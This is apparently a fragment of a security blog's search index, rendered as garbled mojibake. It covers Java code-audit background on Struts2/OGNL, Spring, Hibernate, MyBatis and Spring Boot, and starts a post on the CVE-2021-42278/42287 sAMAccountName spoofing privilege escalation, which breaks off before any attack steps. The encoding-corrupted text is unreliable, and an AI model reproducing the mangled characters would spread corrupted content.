","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:2:1","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.2 Struts2 Struts2 æ˜¯ä¸€ä¸ªåŸºäº MVC è®¾è®¡æ¨¡å¼çš„ Web åº”ç”¨æ¡†æ¶ï¼Œå®ƒæœ¬è´¨ä¸Šç›¸å½“äºä¸€ä¸ªServletã€‚ä½†æ˜¯ J2EE çš„ MVC è®¾è®¡æ¨¡å¼ä¸­ï¼ŒStruts2 ä½œä¸ºæ§åˆ¶å™¨ï¼ˆControllerï¼‰æ¥å»ºç«‹æ¨¡å‹ä¸è§†å›¾çš„æ•°æ®äº¤äº’ã€‚Struts 2 æ˜¯åŸºäº Filterï¼Œä¸ºäº†å®ç° AOP çš„æ€æƒ³ã€‚ 2.2.1 Struts2 æ¶æ„ Servlet Filtersï¼šè¿‡æ»¤å™¨é“¾ï¼Œclient çš„å…¨éƒ¨è¯·æ±‚éƒ½è¦ç»è¿‡ Filter é“¾çš„å¤„ç†ã€‚ Struts Coreï¼šStruts2 çš„æ ¸å¿ƒå¤„ç†éƒ¨åˆ†ã€‚ Interceptorsï¼š Struts2 çš„æ‹¦æˆªå™¨ã€‚Struts2 æä¾›äº†éå¸¸å¤šé»˜è®¤çš„æ‹¦æˆªå™¨ã€‚ ä¹Ÿå¯ä»¥è‡ªå·±å®šä¹‰çš„æ‹¦æˆªå™¨ï¼Œç”¨æ¥å®ç°å®é™…ä¸šåŠ¡è¦çš„åŠŸèƒ½ã€‚ User Createdï¼šç”±å¼€å‘è€…åˆ›å»ºçš„ã€‚åŒ…å« struts.xmlã€Actionã€Template. 2.2.2 Struts2 çš„ MVC 2.2.3 OGNL è¡¨è¾¾å¼ æ”¯æŒå¯¹è±¡æ–¹æ³•è°ƒç”¨ï¼Œå½¢å¼å¦‚ï¼šobjName.methodName()ï¼› æ”¯æŒç±»é™æ€çš„æ–¹æ³•è°ƒç”¨å’Œå€¼è®¿é—®ï¼Œè¡¨è¾¾å¼çš„æ ¼å¼ä¸º@[ç±»å…¨å(åŒ…æ‹¬åŒ…è·¯å¾„)]@[æ–¹æ³•å|å€¼å]ï¼Œä¾‹å¦‚ï¼š@java.lang.String@addï¼ˆ'11'ï¼Œ'hahhaha'ï¼‰ æ”¯æŒèµ‹å€¼æ“ä½œå’Œè¡¨è¾¾å¼ä¸²è”ï¼Œä¾‹å¦‚ï¼šnumber=18ï¼Œprice=100ï¼ŒcalculatePrice(price*number)ï¼›é‚£ä¹ˆè¿”å› 1800ï¼› è®¿é—® OGNL ä¸Šä¸‹æ–‡(OGNLcontext)åœ¨ Struts2 ä¸­æ˜¯ ActionContextï¼› æ“ä½œï¼ˆåˆ›å»ºï¼‰é›†åˆå¯¹è±¡ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:2:2","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.3 Spring æ–¹ä¾¿è§£è€¦ï¼Œç®€åŒ–å¼€å‘ï¼ˆé«˜å†…èšä½è€¦åˆï¼‰ã€‚Spring å°±æ˜¯ä¸€ä¸ªå¤§å·¥å‚ï¼ˆIoCå®¹å™¨ï¼‰ï¼Œå¯ä»¥å°†æ‰€æœ‰å¯¹è±¡åˆ›å»ºå’Œä¾èµ–å…³ç³»ç»´æŠ¤ï¼Œäº¤ç»™ Spring ç®¡ç†ï¼ŒSpring å·¥å‚æ˜¯ç”¨äºç”Ÿæˆ beanã€‚ æä¾›é¢å‘åˆ‡é¢ï¼ˆAOPï¼‰ç¼–ç¨‹ã€‚Spring å¯ä»¥æ–¹ä¾¿çš„å®ç°å¯¹ç¨‹åºè¿›è¡Œæƒé™æ‹¦æˆªã€è¿è¡Œç›‘æ§ç­‰åŠŸèƒ½ã€‚ æ–¹ä¾¿é›†æˆå„ç§ä¼˜ç§€æ¡†æ¶ã€‚Spring ä¸æ’æ–¥å„ç§ä¼˜ç§€çš„å¼€æºæ¡†æ¶ï¼Œå…¶å†…éƒ¨æä¾›äº†å¯¹å„ç§ä¼˜ç§€æ¡†æ¶ï¼ˆå¦‚ï¼šStruts.Hibernate.ã€MyBatis ç­‰ï¼‰çš„ç›´æ¥æ”¯æŒã€‚ é™ä½ JavaEE API çš„ä½¿ç”¨éš¾åº¦ã€‚Spring å¯¹ JavaEE å¼€å‘ä¸­éå¸¸éš¾ç”¨çš„ä¸€äº› APIï¼ˆJDBCã€JavaMailã€è¿œç¨‹è°ƒç”¨ç­‰ï¼‰ï¼Œéƒ½æä¾›äº†å°è£…ï¼Œä½¿è¿™äº› API åº”ç”¨éš¾åº¦å¤§å¤§é™ä½ã€‚ 2.3.1 Spring æ ¸å¿ƒæ¦‚å¿µ - IoC IoC æ˜¯ Inversion of Control çš„ç¼©å†™ï¼Œå¤šæ•°ä¹¦ç±ç¿»è¯‘æˆã€Œæ§åˆ¶åè½¬ã€ã€‚ä¸ºäº†è§£å†³å¯¹è±¡ä¹‹é—´çš„è€¦åˆåº¦è¿‡é«˜çš„é—®é¢˜ï¼Œè½¯ä»¶ä¸“å®¶Michael Mattsonæå‡ºäº† IoC ç†è®ºï¼Œç”¨æ¥å®ç°å¯¹è±¡ä¹‹é—´çš„è§£è€¦ã€‚ 2004 å¹´ï¼ŒMartin Fowler æ¢è®¨äº†åŒä¸€ä¸ªé—®é¢˜ï¼Œæ—¢ç„¶ IOC æ˜¯æ§åˆ¶åè½¬ï¼Œé‚£ä¹ˆåˆ°åº•æ˜¯ã€Œå“ªäº›æ–¹é¢çš„æ§åˆ¶è¢«åè½¬äº†å‘¢ï¼Ÿã€ï¼Œç»è¿‡è¯¦ç»†åœ°åˆ†æå’Œè®ºè¯åï¼Œä»–å¾—å‡ºäº†ç­”æ¡ˆï¼šã€Œè·å¾—ä¾èµ–å¯¹è±¡çš„è¿‡ç¨‹è¢«åè½¬äº†ã€ã€‚æ§åˆ¶è¢«åè½¬ä¹‹åï¼Œè·å¾—ä¾èµ–å¯¹è±¡çš„è¿‡ç¨‹ç”±è‡ªèº«ç®¡ç†å˜ä¸ºäº†ç”± IOC å®¹å™¨ä¸»åŠ¨æ³¨å…¥ã€‚äºæ˜¯ï¼Œä»–ç»™ã€Œæ§åˆ¶åè½¬ã€å–äº†ä¸€ä¸ªæ›´åˆé€‚çš„åå­—å«åšã€Œä¾èµ–æ³¨å…¥ï¼ˆDependency Injectionï¼‰ã€ã€‚ ä»–çš„è¿™ä¸ªç­”æ¡ˆï¼Œå®é™…ä¸Šç»™å‡ºäº†å®ç° IoC çš„æ–¹æ³•ï¼šæ³¨å…¥ã€‚æ‰€è°“ä¾èµ–æ³¨å…¥ï¼Œå°±æ˜¯ç”± IOC å®¹å™¨åœ¨è¿è¡ŒæœŸé—´ï¼ŒåŠ¨æ€åœ°å°†æŸç§ä¾èµ–å…³ç³»æ³¨å…¥åˆ°å¯¹è±¡ä¹‹ä¸­ã€‚ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰å’Œæ§åˆ¶åè½¬ï¼ˆIOCï¼‰æ˜¯ä»ä¸åŒçš„è§’åº¦çš„æè¿°çš„åŒä¸€ä»¶äº‹æƒ…ï¼Œå°±æ˜¯æŒ‡é€šè¿‡å¼•å…¥ IOC å®¹å™¨ï¼Œåˆ©ç”¨ä¾èµ–å…³ç³»æ³¨å…¥çš„æ–¹å¼ï¼Œå®ç°å¯¹è±¡ä¹‹é—´çš„è§£è€¦ã€‚ 2.3.2 IoC ä¼˜ç‚¹ 2.3.3 Spring æ ¸å¿ƒæ¦‚å¿µ - Bean Spring Bean æ˜¯ä¸€ä¸ªè¢«å®ä¾‹åŒ–ï¼Œç»„è£…ï¼Œå¹¶é€šè¿‡ Spring IoC å®¹å™¨æ‰€ç®¡ç†çš„å¯¹è±¡ã€‚ Spring Bean æ˜¯ä»»ä½• Spring åº”ç”¨ç¨‹åºçš„åŸºæœ¬æ„å»ºå—ã€‚å¤§å¤šæ•°åº”ç”¨ç¨‹åºçš„é€»è¾‘ä»£ç éƒ½å°†æ”¾åœ¨ Spring bean ä¸­ã€‚ Spring Bean çš„ç®¡ç†åŒ…æ‹¬ï¼š åˆ›å»ºä¸€ä¸ªå¯¹è±¡ æä¾›ä¾èµ–é¡¹ï¼ˆä¾‹å¦‚å…¶ä»– beanï¼Œé…ç½®å±æ€§ï¼‰ã€‚ æ‹¦æˆªå¯¹è±¡æ–¹æ³•è°ƒç”¨ä»¥æä¾›é¢å¤–çš„æ¡†æ¶åŠŸèƒ½ã€‚ é”€æ¯ä¸€ä¸ªå¯¹è±¡ ä¸‰ç§ä¸åŒçš„æ–¹å¼å®šä¹‰ Spring beanï¼š ä½¿ç”¨æ„é€ å‹ @Component æ³¨é‡Šï¼ˆæˆ–å…¶è¡ç”Ÿç‰©ï¼‰æ³¨é‡Šç±» ç¼–å†™åœ¨è‡ªå®šä¹‰ Java é…ç½®ç±»ä¸­ä½¿ç”¨ @Bean æ³¨é‡Šçš„ Bean å·¥å‚æ–¹æ³•ã€‚ åœ¨ XML é…ç½®æ–‡ä»¶ä¸­å£°æ˜ Bean å®šä¹‰ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:2:3","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.4 Hibernate 2.4.1 å®šä¹‰ Hibernate æ˜¯ç”± Gavin King äº 2001 å¹´åˆ›å»ºçš„å¼€æ”¾æºä»£ç çš„ä¸€ç§ ORM ï¼ˆObject_Relative Mappingï¼Œå³å¯¹è±¡å…³ç³»æ˜ å°„ï¼‰æ¡†æ¶ï¼Œæ˜¯ Java å¯¹è±¡å’Œæ•°æ®åº“æœåŠ¡å™¨ä¹‹é—´çš„æ¡¥æ¢ï¼Œåœ¨ Java å¯¹è±¡ä¸å…³ç³»æ•°æ®åº“ä¹‹é—´å»ºç«‹æŸç§æ˜ å°„ï¼Œä»¥å®ç°ç›´æ¥å­˜å– Java å¯¹è±¡ï¼Œå°†å¼€å‘äººå‘˜ä»å…¬å…±æ•°æ®æŒç»­æ€§ç¼–ç¨‹å·¥ä½œä¸­è§£æ”¾å‡ºæ¥ã€‚ 2.4.2 ORM ORM - å¯¹è±¡å…³ç³»æ˜ å°„ï¼ŒORM å…³æ³¨çš„æ˜¯å¯¹è±¡ä¸æ•°æ®åº“ä¸­åˆ—çš„å…³ç³» ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:2:4","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3 SSM æ¡†æ¶ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:3:0","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.1 MVC ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:3:1","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.2 Spring MVC Spring MVC å±äº Spring FrameWork çš„åç»­äº§å“ï¼Œå·²ç»èåˆåœ¨ Spring Web Flow é‡Œé¢ã€‚Spring æ¡†æ¶æä¾›äº†æ„å»º Web åº”ç”¨ç¨‹åºçš„å…¨åŠŸèƒ½ MVC æ¨¡å—ã€‚ä½¿ç”¨ Spring å¯æ’å…¥çš„ MVC æ¶æ„ï¼Œä»è€Œåœ¨ä½¿ç”¨ Spring è¿›è¡Œ WEB å¼€å‘æ—¶ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨ Spring çš„ Spring MVC æ¡†æ¶æˆ–é›†æˆå…¶ä»– MVC å¼€å‘æ¡†æ¶ï¼Œå¦‚ Struts1ï¼ˆç°åœ¨ä¸€èˆ¬ä¸ç”¨ï¼‰ï¼ŒStruts2ï¼ˆä¸€èˆ¬è€é¡¹ç›®ä½¿ç”¨ï¼‰ç­‰ã€‚ Spring MVC å·²ç»æˆä¸ºç›®å‰æœ€ä¸»æµçš„ MVC æ¡†æ¶ä¹‹ä¸€ï¼Œä» Spring3.0 çš„å‘å¸ƒï¼Œå°±å·²å…¨é¢è¶…è¶Š Struts2ï¼Œæˆä¸ºæœ€ä¼˜ç§€çš„ MVC æ¡†æ¶ã€‚å®ƒé€šè¿‡ä¸€å¥—æ³¨è§£ï¼Œè®©ä¸€ä¸ªç®€å•çš„ Java ç±»æˆä¸ºå¤„ç†è¯·æ±‚çš„æ§åˆ¶å™¨ï¼Œè€Œæ— é¡»å®ç°ä»»ä½•æ¥å£ã€‚åŒæ—¶å®ƒè¿˜æ”¯æŒ RESTful ç¼–ç¨‹é£æ ¼çš„è¯·æ±‚ã€‚ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:3:2","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.3 Spring MVC æ‰§è¡Œæµç¨‹ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:3:3","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.4 Spring MVC ä¸ Struts 2 çš„å¯¹æ¯” 3.4.1 æ¡†æ¶æœºåˆ¶ Struts2 é‡‡ç”¨ Filter å®ç°ï¼ŒSpring MVC åˆ™é‡‡ç”¨ Servlet å®ç°ã€‚ Filter åœ¨å®¹å™¨å¯åŠ¨ä¹‹åå³åˆå§‹åŒ–ï¼›æœåŠ¡åœæ­¢ä»¥åå æ¯ï¼Œæ™šäº Servletã€‚Servlet åœ¨æ˜¯åœ¨è°ƒç”¨æ—¶åˆå§‹åŒ–ï¼Œå…ˆäº Filter è°ƒç”¨ï¼ŒæœåŠ¡åœæ­¢åé”€æ¯ã€‚ Spring MVC åŸºäºæ–¹æ³•çš„æ‹¦æˆªï¼Œæœ‰åŠ è½½ä¸€æ¬¡å•ä¾‹æ¨¡å¼ bean æ³¨å…¥ã€‚è€Œ struts2 æ˜¯ç±»çº§åˆ«çš„æ‹¦æˆªï¼Œæ¯æ¬¡è¯·æ±‚å¯¹åº”å®ä¾‹ä¸€ä¸ªæ–°çš„ Actionï¼Œéœ€è¦åŠ è½½æ‰€æœ‰çš„å±æ€§å€¼æ³¨å…¥ï¼Œæ‰€ä»¥ï¼ŒSpring MVC å¼€å‘æ•ˆç‡å’Œæ€§èƒ½é«˜äº Struts2ã€‚ Struts 2 æ›´åŠ ç¬¦åˆ AOP çš„ç¼–ç¨‹æ€æƒ³ï¼ŒSpring MVC æ¯”è¾ƒè°¨æ…ï¼Œåœ¨ Servlet ä¸Šæ‰©å±•ã€‚ 3.4.2 æ‹¦æˆªæœºåˆ¶ Struts2 Struts2 æ¡†æ¶æ˜¯ç±»çº§åˆ«çš„æ‹¦æˆªï¼Œæ¯æ¬¡è¯·æ±‚å°±ä¼šåˆ›å»ºä¸€ä¸ªActionï¼Œå’Œ Spring æ•´åˆæ—¶ Struts2 çš„ Action Bean æ³¨å…¥ä½œç”¨åŸŸæ˜¯åŸå‹æ¨¡å¼ prototypeï¼Œç„¶åé€šè¿‡ setterï¼Œgetter æŠŠ request æ•°æ®æ³¨å…¥åˆ°å±æ€§ã€‚ Struts2ä¸­ï¼Œä¸€ä¸ª Action å¯¹åº”ä¸€ä¸ª requestï¼Œresponse ä¸Šä¸‹æ–‡ï¼Œåœ¨æ¥æ”¶å‚æ•°æ—¶ï¼Œå¯ä»¥é€šè¿‡å±æ€§æ¥æ”¶ï¼Œè¿™è¯´æ˜å±æ€§å‚æ•°æ˜¯è®©å¤šä¸ªæ–¹æ³•å…±äº«çš„ã€‚ Struts2 ä¸­ Action çš„ä¸€ä¸ªæ–¹æ³•å¯ä»¥å¯¹åº”ä¸€ä¸ª urlï¼Œè€Œå…¶ç±»å±æ€§å´è¢«æ‰€æœ‰æ–¹æ³•å…±äº«ï¼Œè¿™ä¹Ÿå°±æ— æ³•ç”¨æ³¨è§£æˆ–å…¶ä»–æ–¹å¼æ ‡è¯†å…¶æ‰€å±æ–¹æ³•äº†ã€‚ SpringMVC Spring MVC æ˜¯æ–¹æ³•çº§åˆ«çš„æ‹¦æˆªï¼Œä¸€ä¸ªæ–¹æ³•å¯¹åº”ä¸€ä¸ª Request ä¸Šä¸‹æ–‡ï¼Œæ‰€ä»¥æ–¹æ³•ç›´æ¥åŸºæœ¬ä¸Šæ˜¯ç‹¬ç«‹çš„ï¼Œç‹¬äº« requestï¼Œresponse æ•°æ®ã€‚è€Œæ¯ä¸ªæ–¹æ³•åŒæ—¶åˆä½•ä¸€ä¸ª url å¯¹åº”ï¼Œå‚æ•°çš„ä¼ é€’æ˜¯ç›´æ¥æ³¨å…¥åˆ°æ–¹æ³•ä¸­çš„ï¼Œæ˜¯æ–¹æ³•æ‰€ç‹¬æœ‰çš„ã€‚å¤„ç†ç»“æœé€šè¿‡ ModeMap è¿”å›ç»™æ¡†æ¶ã€‚ åœ¨ Spring æ•´åˆæ—¶ï¼ŒSpring MVC çš„ Controller Bean é»˜è®¤å•ä¾‹æ¨¡å¼ Singletonï¼Œæ‰€ä»¥é»˜è®¤å¯¹æ‰€æœ‰çš„è¯·æ±‚ï¼Œåªä¼šåˆ›å»ºä¸€ä¸ª Controllerï¼Œæœ‰å› ä¸ºæ²¡æœ‰å…±äº«çš„å±æ€§ï¼Œæ‰€ä»¥æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå¦‚æœè¦æ”¹å˜é»˜è®¤çš„ä½œç”¨åŸŸï¼Œéœ€è¦æ·»åŠ  @Scope æ³¨è§£ä¿®æ”¹ã€‚ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:3:4","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3.5 Mybatis MyBatis æ˜¯ä¸€ä¸ªæ”¯æŒæ™®é€š SQL æŸ¥è¯¢ã€å­˜å‚¨è¿‡ç¨‹ä»¥åŠé«˜çº§æ˜ å°„çš„æŒä¹…å±‚æ¡†æ¶ï¼Œå®ƒæ¶ˆé™¤äº†å‡ ä¹æ‰€æœ‰çš„ JDBC ä»£ç å’Œå‚æ•°çš„æ‰‹åŠ¨è®¾ç½®ä»¥åŠå¯¹ç»“æœé›†çš„æ£€ç´¢ï¼Œå¹¶ä½¿ç”¨ç®€å•çš„ XML æˆ–æ³¨è§£è¿›è¡Œé…ç½®å’ŒåŸå§‹æ˜ å°„ï¼Œç”¨ä»¥å°†æ¥å£å’Œ Java çš„ POJO ï¼ˆPlain Old Java Objectï¼Œæ™®é€šJavaå¯¹è±¡ï¼‰æ˜ å°„æˆæ•°æ®åº“ä¸­çš„è®°å½•ï¼Œä½¿å¾— Java å¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨é¢å‘å¯¹è±¡çš„ç¼–ç¨‹æ€æƒ³æ¥æ“ä½œæ•°æ®åº“ã€‚ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:3:5","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4 Spring Boot \u0026 Spring Cloud ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:4:0","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.1 Spring Boot 4.1.1 Spring Boot å®šä¹‰ Spring Boot æ˜¯ Spring å¼€æºç»„ç»‡ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œä¹Ÿæ˜¯ Spring ç»„ä»¶ä¸€ç«™å¼è§£å†³æ–¹æ¡ˆï¼Œä¸»è¦æ˜¯ä¸ºäº†ç®€åŒ–ä½¿ç”¨ Spring æ¡†æ¶çš„éš¾åº¦ï¼Œç®€çœç¹é‡çš„é…ç½®ã€‚ Spring Boot æä¾›äº†å„ç§ç»„ä»¶çš„å¯åŠ¨å™¨ï¼ˆstartersï¼‰ï¼Œå¼€å‘è€…åªè¦èƒ½é…ç½®å¥½å¯¹åº”ç»„ä»¶å‚æ•°ï¼ŒSpringBoot å°±ä¼šè‡ªåŠ¨é…ç½®ï¼Œè®©å¼€å‘è€…èƒ½å¿«é€Ÿæ­å»ºä¾èµ–äº Spring ç»„ä»¶çš„ Java é¡¹ç›®ã€‚ Spring Boot ä¸ä½†èƒ½åˆ›å»ºä¼ ç»Ÿçš„ war åŒ…åº”ç”¨ï¼Œè¿˜èƒ½åˆ›å»ºç‹¬ç«‹çš„ä¸ä¾èµ–äºä»»ä½•å¤–éƒ¨å®¹å™¨ï¼ˆå¦‚ï¼štomcatï¼‰çš„ç‹¬ç«‹åº”ç”¨ï¼Œä½¿ç”¨ java -jar å‘½ä»¤å°±èƒ½å¯åŠ¨ã€‚åŒæ—¶ï¼ŒSpring Boot åœ°æä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·æ¥æ‰§è¡Œ Spring çš„è„šæœ¬ã€‚ 4.1.2 Spring Boot ç‰¹ç‚¹ ç‹¬ç«‹è¿è¡Œï¼šæ‰“åŒ…å®¹å™¨ï¼Œç”Ÿæˆ jar ç®€åŒ– Maven é…ç½®ï¼šspring-boot-starter-xx è‡ªåŠ¨é…ç½®ï¼šæ ¹æ®å½“å‰ç±»è·¯å¾„ä¸‹çš„ç±»æˆ–è€… jar åŒ…é‡Œé¢æ¥çš„ç±»æ¥è‡ªåŠ¨é…ç½® Spring Bean ã€‚ æ— ä»£ç ç”Ÿæˆå’Œ XML é…ç½®ï¼šå€ŸåŠ©æ³¨è§£ åº”ç”¨ç›‘æ§ï¼šæä¾›ä¸€ç³»åˆ—ç«¯ç‚¹å¯ä»¥ç›‘æ§æœåŠ¡åŠåº”ç”¨ï¼Œèƒ½å¯¹ Spring åº”ç”¨åšå¥åº·æ£€æµ‹ã€‚ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:4:1","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.2 Spring Cloud 4.2.1 Spring Cloud å®šä¹‰ Spring Cloud æ˜¯ä¸€ç³»åˆ—æ¡†æ¶çš„æœ‰åºé›†åˆã€‚å®ƒåˆ©ç”¨ Spring Boot çš„å¼€å‘ä¾¿åˆ©æ€§å·§å¦™åœ°ç®€åŒ–äº†åˆ†å¸ƒå¼ç³»ç»ŸåŸºç¡€è®¾æ–½çš„å¼€å‘ï¼Œå¦‚æœåŠ¡å‘ç°æ³¨å†Œã€é…ç½®ä¸­å¿ƒã€æ¶ˆæ¯æ€»çº¿ã€è´Ÿè½½å‡è¡¡ã€æ–­è·¯å™¨ã€æ•°æ®ç›‘æ§ç­‰ï¼Œéƒ½å¯ä»¥ç”¨ SpringBoot çš„å¼€å‘é£æ ¼åšåˆ°ä¸€é”®å¯åŠ¨å’Œéƒ¨ç½²ã€‚ Spring Cloud å¹¶æ²¡æœ‰é‡å¤åˆ¶é€ è½®å­ï¼Œå®ƒåªæ˜¯å°†ç›®å‰å„å®¶å…¬å¸å¼€å‘çš„æ¯”è¾ƒæˆç†Ÿã€ç»å¾—èµ·å®é™…è€ƒéªŒçš„æœåŠ¡æ¡†æ¶ç»„åˆèµ·æ¥ï¼Œé€šè¿‡ Spring Boot é£æ ¼è¿›è¡Œå†å°è£…å±è”½æ‰äº†å¤æ‚çš„é…ç½®å’Œå®ç°åŸç†ï¼Œæœ€ç»ˆç»™å¼€å‘è€…ç•™å‡ºäº†ä¸€å¥—ç®€å•æ˜“æ‡‚ã€æ˜“éƒ¨ç½²å’Œæ˜“ç»´æŠ¤çš„åˆ†å¸ƒå¼ç³»ç»Ÿå¼€å‘å·¥å…·åŒ…ã€‚ 4.2.2 Spring Cloud Alibaba æ¡†æ¶ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:4:2","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"sAMAccountName spoofing","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"SAM-AccountName spoofing ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 èƒŒæ™¯ 2021 å¹´ 11 æœˆï¼Œæœ‰ä¸¤ä¸ªæ¼æ´ CVE-2021-42278 \u0026 CVE-2021-42287 è¢«éœ²ï¼Œä¸¤ä¸ªæ¼æ´ç»„åˆå¯å¯¼è‡´åŸŸå†…æ™®é€šç”¨æˆ·æƒé™æå‡è‡³åŸŸç®¡æƒé™ã€‚ ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.1 CVE-2021-42278 windows åŸŸå†…çš„æœºå™¨è´¦æˆ·çš„åå­—ä»¥ $ ç»“å°¾ï¼Œä½† DC æ²¡æœ‰å¯¹åŸŸå†…æœºå™¨è´¦æˆ·ååšéªŒè¯ã€‚ä¸ CVE-2021-42287 ç»“åˆä½¿ç”¨ï¼Œå®ƒå…è®¸æ”»å‡»è€…å†’å……åŸŸæ§åˆ¶å™¨è´¦æˆ·ã€‚ ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.2 CVE-2021-42287 åœ¨ kerberos è®¤è¯è¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·è¦è®¿é—®æŸä¸ªæœåŠ¡ï¼Œåœ¨è·å–æœåŠ¡ç¥¨æ® ST ä¹‹å‰ï¼Œéœ€è¦ç”³è¯· 